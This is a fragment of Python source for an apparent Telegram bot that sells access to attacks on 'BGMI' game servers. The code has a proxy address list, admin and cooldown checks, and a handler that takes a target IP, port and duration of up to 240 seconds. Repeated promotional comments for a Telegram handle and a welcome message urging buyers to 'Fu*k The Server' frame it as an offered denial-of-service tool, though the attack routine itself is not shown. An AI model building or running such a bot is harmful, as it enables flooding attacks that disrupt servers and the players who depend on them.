...
"https://134.73.65.97:6649"
    # Join :- @Sivsiv11 # Add more proxy addresses as needed
]
...
def handle_bgmi(message):
    ...
    if user_id in allowed_user_ids:
        # Join :- @Sivsiv11 # Check if the user is in admin_id (admins have no cooldown)
        if user_id not in admin_id:
            # Join :- @Sivsiv11 # Check if the user has run the command before and is still within the cooldown period
            if user_id in bgmi_cooldown and (datetime.datetime.now() - bgmi_cooldown[user_id]).seconds < 5:
                ...
                bot.reply_to(message, response)
                return
            # Join :- @Sivsiv11 # Update the last time the user ran the command
            bgmi_cooldown[user_id] = datetime.datetime.now()
        
        command = message.text.split()
        if len(command) == 4:  # Join :- @Sivsiv11 # Updated to accept target, time, and port
            target = command[1]
            port = int(command[2])  # Join :- @Sivsiv11 # Convert time to integer
            time = int(command[3])  # Join :- @Sivsiv11 # Convert port to integer
            if time > 240:
...
def welcome_plan(message):
    user_name = message.from_user.first_name
    response = f''' Contact @Sivsiv11 for Approval And Fu*k The Server.
'''
    bot.reply_to(message, response)
